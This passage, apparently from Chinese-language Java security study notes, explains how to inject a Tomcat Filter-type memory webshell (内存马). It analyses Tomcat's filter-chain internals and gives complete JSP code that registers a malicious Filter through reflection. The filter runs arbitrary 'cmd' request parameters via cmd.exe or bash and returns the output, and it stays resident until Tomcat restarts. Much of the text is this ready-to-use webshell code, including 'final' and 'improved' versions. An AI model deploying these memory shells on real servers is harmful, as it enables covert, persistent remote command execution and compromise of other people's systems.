        System.out.println("PocFilter 过滤操作");
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if(req.getParameter("cmd") != null){
            String osType = System.getProperty("os.name");
            String[] cmd = null;
            if (osType.toLowerCase().contains("win")){
                cmd = new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            }else {
                cmd = new String[]{"sh", "-c", req.getParameter("cmd")};
            }
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\a");
            String out = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(out);
            servletResponse.getWriter().flush();
            return;
        }
        // 放行
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("PocFilter  destory");
    }
}
```

xml

```
<filter>
    <filter-name>PocFilter</filter-name>
    <filter-class>PocFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>PocFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```



**获取StandardContext**

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>$Title$</title>
</head>
<body>

<%
    // 获得 StandardContext
    Field field = request.getClass().getDeclaredField("request");
    field.setAccessible(true);
    Request req  = (Request) field.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>

</body>
</html>
```

**添加FilterDef**

有了恶意的PocFilter和StandardContext后，参照tomcat源代码来实现注册自定义filter的操作。

FilterDef就相当于web.xml中的filter。

Tomcat 在 org.apache.catalina.core.ApplicationContextFacade 当中实现了 ServletContext 中的 addFilter 和 addServlet ，这里我们分别看看，这里主要看 addFilter 的实现：

![image-20220210210337115](img/image-20220210210337115.png)![image-20220210210337115](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210210337115.png?lastModify=1646033842)

```
public Dynamic addFilter(String filterName, String className) {
    return SecurityUtil.isPackageProtectionEnabled() ? (Dynamic)this.doPrivileged("addFilter", new Object[]{filterName, className}) : this.context.addFilter(filterName, className);
}

public Dynamic addFilter(String filterName, Filter filter) {
    return SecurityUtil.isPackageProtectionEnabled() ? (Dynamic)this.doPrivileged("addFilter", new Class[]{String.class, Filter.class}, new Object[]{filterName, filter}) : this.context.addFilter(filterName, filter);
}

public Dynamic addFilter(String filterName, Class<? extends Filter> filterClass) {
    return SecurityUtil.isPackageProtectionEnabled() ? (Dynamic)this.doPrivileged("addFilter", new Class[]{String.class, Class.class}, new Object[]{filterName, filterClass}) : this.context.addFilter(filterName, filterClass);
}
```

跟进`this.context.addFilter`方法，实际就是`ApplicationContext#addFilter`，

![image-20220210210617634](img/image-20220210210617634.png)![image-20220210210617634](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210210617634.png?lastModify=1646033842)

在addFilter中，代码的作用实际就是新建一个 filterDef 然后调用this.context.addFilterDef(filterDef); 进行添加了而已。此外，我们有了StandardContext，完全可以自行进行添加：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>$Title$</title>
</head>
<body>

<%
    // 获得 StandardContext
    Field field = request.getClass().getDeclaredField("request");
    field.setAccessible(true);
    Request req  = (Request) field.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>

<%
    String name = "123456";
    Filter filter = new PocFilter();
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    context.addFilterDef(filterDef);

%>

</body>
</html>
```

**添加FilterMap**

FilterMap用于保存filter名称与url的映射，就相当于web.xml中的filter-mapping：

```
<filter-mapping>
    <filter-name>PocFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

tomcat的filter的创建是在StandardWrapperValve#invoke() 函数中完成的：

通过 createFilterChain 创建一个ApplicationFilterChain：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

在 createFilterChain() 中会将匹配到的filter加入filterChain：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

注意这里进行if匹配的时候，DispatcherType类型是 REQUEST：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

由于我们上面构造好了 FilterDef，接下来直接构造一个FilterMap，再加入 filterChain就好了：（其中urlPattern自行定义好，只有匹配到才会进行filter处理，可以类似理解为一个webshell后门密码的操作）

```
<%
    // 添加FilterMap
    FilterMap map = new FilterMap();
    map.setFilterName(filterDef.getFilterName());
    map.setDispatcher(DispatcherType.REQUEST.name());
    map.addURLPattern("/shell");

    context.addFilterMapBefore(map);
%>
```

这里为啥要用 addFilterMapBefore() 而不用 addFilterMap() 呢？

从之前的 createFilterChain() 中添加Filter可以看出是按从头到尾的顺序来添加的：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

所以 addFilterMapBefore() 的作用是将当前创建的 filterMap 添加到 filter链的第一位去。

**添加到filterConfigs**

跟进到最开始的StandardContext#filterStart 方法可以看到，遍历了 filterDefs 当中 filterName ：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

然后把对应的 name 添加到 filterConfigs 当中：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

值得注意的是，源代码中是通过 ApplicationFilterConfig (Context context, FilterDef filterDef) 的构造器来获取到filterConfig的：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

说明这个类是依赖FilterDef生成的。

同时，继承自 FilterConfig，那么在jsp中，我们可以通过反射 ApplicationFilterConfig的构造器来获取到 filterConfig 对象，然后添加到 filterConfigs 中：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

为了适配其他tomcat环境，这里通过反射来获取 filterConfigs：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

或者直接刷新 filterConfigs，自动将filterConfig 添加到 filterConfigs 中：

```
<%
    context.filterStart();
%>
```

#### 效果

shell.jsp

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page language="java" import="filter.PocFilter" %>
<html>
<head>
    <title>$Title$</title>
</head>
<body>

<%
    // 获得 StandardContext
    Field field = request.getClass().getDeclaredField("request");
    field.setAccessible(true);
    Request req  = (Request) field.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>

<%
    String name = "123456";
    Filter filter = new PocFilter();
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    context.addFilterDef(filterDef);

%>

<%
    // 添加FilterMap
    FilterMap map = new FilterMap();
    map.setFilterName(filterDef.getFilterName());
    map.setDispatcher(DispatcherType.REQUEST.name());
    map.addURLPattern("/shell");

    context.addFilterMapBefore(map);
%>

<%
    context.filterStart();
%>

</body>
</html>
```



![image-20220210213458095](img/image-20220210213458095.png)![image-20220210213458095](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210213458095.png?lastModify=1646033842)

访问生成内存马

![image-20220210213522741](img/image-20220210213522741.png)![image-20220210213522741](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210213522741.png?lastModify=1646033842)

![image-20220210213541988](img/image-20220210213541988.png)![image-20220210213541988](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210213541988.png?lastModify=1646033842)

来自： https://blog.csdn.net/angry_program/article/details/116661899

## Tomcat-Filter型内存马一

#### Tomcat

tomcat是servlet容器，包含

- Engine，实现类为 org.apache.catalina.core.StandardEngine
- Host , 实现类为 org.apache.catalina.core.StandardHost
- Context ,  实现类为   org.apache.catalina.core.StandardContext
- Wrapper，实现类为  org.apache.catalina.core.StandardWrapper

每个Wrapper实例表示一个具体的Servlet定义，standardWrapper 是 Wrapper 的标准实现类。

（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化）

![image-20210402150543076](img/image-20210402150543076.png)![image-20210402150543076](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20210402150543076.png?lastModify=1646033842)

#### filter 型内存马

![image-20210330212301006](img/image-20210330212301006.png)![image-20210330212301006](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20210330212301006.png?lastModify=1646033842)

上图看出，我们的请求会经过 filter 之后才回到 servlet，那么如果我们动态创建一个 filter并且将其放到最前面，我们的filter就会最先执行，当我们在filter中添加恶意代码，就会进行命令执行，这样就成为了一个内存 webshell。

#### tomcat filter流程分析

先看几个类

- FilterDefs: 存放 FilterDef 的数组，FilterDef 中中存储着我们过滤器名，过滤器实例，作用 url等基本信息
- FilterConfigs: 存放 FilterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter 对象等。
- FilterMaps ：存放 FilterMap 的数组，在 FilterMap 中主要存放着 FilterName 和对应的 URLPattern。
- FilterChain : 过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
- WebXml ：存放着 web.xml 中内容的类
- ContextConfig : web应用的上下文配置类
- StandardContext : Context接口的标准实现类，一个Context代表一个web应用，其下可以包含多个 Wrapper
- StandardWrapperValue : 一个Wrapper的标准实现类，一个Wrapper代表一个servler。

接下来分析 tomcat 中是如何将我们自定义的filter进行设置并且调用的。

首先通过`WebXml#getDefaultWebXmlFragment` 返回 webXml实例

![image-20220211145042257](img/image-20220211145042257.png)![image-20220211145042257](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211145042257.png?lastModify=1646033842)

![image-20220211145030320](img/image-20220211145030320.png)![image-20220211145030320](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211145030320.png?lastModify=1646033842)

在 StandardWrapperValve 中会利用 ApplicationFilterFactory 来创建filterChain（filter链），我们跟进这个方法

![image-20220211150230353](img/image-20220211150230353.png)![image-20220211150230353](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211150230353.png?lastModify=1646033842)

首先会调用 getParent获取当前 Context (当前应用)，然后从 Context 中获取 filterMaps

![image-20220211150600536](img/image-20220211150600536.png)![image-20220211150600536](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211150600536.png?lastModify=1646033842)

filterMaps 中存放着过滤器的名字以及作用的 url 等，

![image-20220211150728121](img/image-20220211150728121.png)![image-20220211150728121](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211150728121.png?lastModify=1646033842)

之后会遍历 filterMaps ，如果发现符合当前请求 url 与 filterMap 中的 URLPattern 相匹配，就会进入 if 判断，调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName 名称的 FilterConfig，然后如果不为 null，就进入 if 判断，将 filterConfig 添加到 filterChain 中没跟进addFilter ，

![image-20220211151312257](img/image-20220211151312257.png)![image-20220211151312257](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211151312257.png?lastModify=1646033842)

![image-20220211151617086](img/image-20220211151617086.png)![image-20220211151617086](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211151617086.png?lastModify=1646033842)

在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在（其实就是去重）

下面这个 if 判断其实就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中

![image-20220211151944133](img/image-20220211151944133.png)![image-20220211151944133](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211151944133.png?lastModify=1646033842)

至此 filterChain 组装完毕，重新回到 StandardContextValue，调用 filterChain 的 doFilter 方法，就会依次调用 Filter 链上的 doFilter 方法

![image-20220211152230358](img/image-20220211152230358.png)![image-20220211152230358](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211152230358.png?lastModify=1646033842)

![image-20220211152259739](img/image-20220211152259739.png)![image-20220211152259739](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211152259739.png?lastModify=1646033842)

doFilter 方法中调用 internalDoFilter

![image-20220211152339287](img/image-20220211152339287.png)![image-20220211152339287](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211152339287.png?lastModify=1646033842)

跟进，依次`filterConfig.getFilter()` 取出 filter，调用其 doFilter 方法

![image-20220211152454105](img/image-20220211152454105.png)![image-20220211152454105](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211152454105.png?lastModify=1646033842)

从而调用我们自定义的 doFilter，触发响应代码

![image-20220211152615332](img/image-20220211152615332.png)![image-20220211152615332](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211152615332.png?lastModify=1646033842)

最后放一张来自宽字节安全的图

![image-20210331212905616](img/image-20210331212905616.png)![image-20210331212905616](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20210331212905616.png?lastModify=1646033842)

总结：

1. 根据请求的url从filterMaps中找出与之 url 对应的 filter 名称。
2. 根据filter 名称区 FilterConfigs 中寻找对应名称的 FilterChain
3. 找到对应的 FilterConfig 之后添加到 FilterChain 中，并且返回 FilterChain
4. FilterChain 中调用 internalDoFilter  遍历 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法

> 根据上面的简单总结，不难发现最开始是从 context 中获取的  FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps  的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到  FilterChain 中，最终触发我们的内存shell

#### Filter 型内存马注入- tomcat7.x 以上

该方法只能在 tomcat7.x 以上利用。

前面说到当组装我们的过滤器链的时候 ，是从context中获取到的 FiltersMaps

![image-20220211153512614](img/image-20220211153512614.png)![image-20220211153512614](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211153512614.png?lastModify=1646033842)

所以我们应该获取这个 context，

当我们能直接获取这个 request 的时候，我们这里可以直接使用如下方法

将我们的 ServletContext 转为 StandardContext 从而获取 context 

ps: 当web容器启动的时候会为每个 web 应用都创建一个 ServletContext 对象，代表当前 web 应用

```
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
// ApplicationContext 为 ServletContext 的实现类
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
// 这样我们就获取到了 context 
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

也可以其他方法获取 StandardContext

如果没有request对象的话，可以从当前线程中获取

https://zhuanlan.zhihu.com/p/114625962

从MBean中获取

https://scriptboy.cn/p/tomcat-filter-inject/

![图片](img/640.webp)![图片](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/640.webp?lastModify=1646033842)

获得 context 之后，我们可以发现其中 filterConfigs，filterDefs，filterMaps 这三个参数和我们的 filter 有关，那么如果我们可以控制这几个变量就可以注入内存马

![image-20220211160437844](img/image-20220211160437844.png)![image-20220211160437844](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211160437844.png?lastModify=1646033842)

- FilterDefs: 存放 FilterDef 的数组，FilterDef 中存储着过滤器名，过滤器实例，作用url等基本信息
- filterConfigs : 存放 filterConfigs的数组，在 FilterConfig中存放 FilterDef 和 Filter 对象等信息 
- filterMaps :  一个存放 FilterMap 的数组，在 FilterMap 中存放 FilterName 和对应的 URLPattern

![image-20220211160840670](img/image-20220211160840670.png)![image-20220211160840670](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211160840670.png?lastModify=1646033842)

https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w

> 注入内存马实际上是模拟了在 web.xml 中写配置的过程，两者一一对应。
>
> - filterDefs 存放了 filter的定义，对应
>
>   ```
>   <filter>
>       <filter-name>MyFilter</filter-name>
>       <filter-class>MyFilter</filter-class>
>   </filter>
>   ```
>
> - filterConfigs 除了存放 filterDef 还保存了当时的 Context，
>
>   ![image-20220211161648346](img/image-20220211161648346.png)![image-20220211161648346](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211161648346.png?lastModify=1646033842)
>
> - filterMaps : 对应 web.xml 中配置的 <filter-mapping>，代表各个 filter之间的调用顺序
>
>   ```
>   <filter-mapping>
>       <filter-name>MyFilter</filter-name>
>       <url-pattern>/*</url-pattern>
>   </filter-mapping>
>   ```
>
> 
>
>   ![image-20220211161757576](img/image-20220211161757576.png)![image-20220211161757576](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220211161757576.png?lastModify=1646033842)

实现filter型内存马步骤

- 创建恶意filter
- 用 filterDef 对 filter 进行封装
- 将 filterDef 添加到 filterDefs 和 filterConfig
- 创建 filterMap，将我们的 filter 和 urlPattern 相对应，存放到 filterMaps 中。放到最前面，最先触发

每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。

```
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);
// 首先判断名字是否存在，如果不存在我们就进行注入
  if (filterConfigs.get(name) == null){
    		// 创建恶意 Filter
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        /**
         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类
         */
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());

        // 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中
        standardContext.addFilterDef(filterDef);

        /**
         * 创建一个filtermap
         * 设置filter的名字和对应的urlpattern
         */
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
    		// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        /**
         * 将filtermap 添加到 filterMaps 中的第一个位置
         */
        standardContext.addFilterMapBefore(filterMap);

        /**
         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入
         */
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        /**
         * 将 name 和 filterConfig 作为 key-value进行传入
         */
        filterConfigs.put(name,filterConfig);
        out.print("Inject Success !");
    }
```

ps：前文说到该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3

```
filterMap.setDispatcher(DispatcherType.REQUEST.name());
```

最终内存马

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "KpLi0rn";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("Inject Success !");
    }
%>
```

改善般

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "KpLi0rn";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if(req.getParameter("cmd") != null){
                    String osType = System.getProperty("os.name");
                    String[] cmd = null;
                    if (osType.toLowerCase().contains("win")){
                        cmd = new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    }else {
                        cmd = new String[]{"sh", "-c", req.getParameter("cmd")};
                    }
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                    Scanner scanner = new Scanner(in).useDelimiter("\\a");
                    String out = scanner.hasNext() ? scanner.next() : "";
                    servletResponse.getWriter().write(out);
                    servletResponse.getWriter().flush();
                    return;
                }
                // 放行
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/filter_shell");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("Inject Success !");
    }
%>
```

本文中内存马还是需要上传 jsp 来生效，但是实际上利用方式远不止这样，我们还可以借助各种反序列化来动态注册 Filter 等。

来自： http://wjlshare.com/archives/1529

